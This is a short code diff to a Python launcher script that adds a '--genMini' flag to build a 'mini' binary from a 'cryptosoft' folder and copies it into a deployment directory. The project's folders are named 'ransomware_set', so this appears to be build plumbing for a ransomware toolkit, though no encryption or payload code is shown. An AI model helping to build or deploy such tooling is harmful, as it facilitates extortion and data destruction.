@@ -51,6 +51,11 @@ def handle_flags():
             print("Usage: python3 run.py [--clean]")
             print("All settings are in ransomware_set/config.py")
             sys.exit(0)
+        elif arg.startswith("--genMini"):
+            os.chdir("ransomware_set/utils/cryptosoft")
+            os.system("make mini")
+            os.system("mv mini ../../../")
+            sys.exit(0)
         else:
             print("Invalid flag:", arg)
             sys.exit(1)
@@ -74,6 +79,7 @@ if os.listdir(root_path):
 shutil.copytree("ransomware_set/utils", f"{root_path}/utils")
 shutil.copy("ransomware_set/config.py", f"{root_path}/config.py")
 shutil.copy("ransomware_set/core", f"{root_path}/core")
+shutil.copy("ransomware_set/mini", f"{root_path}/mini")
 
 # cd to utils directory
 os.chdir(f"{root_path}/utils")
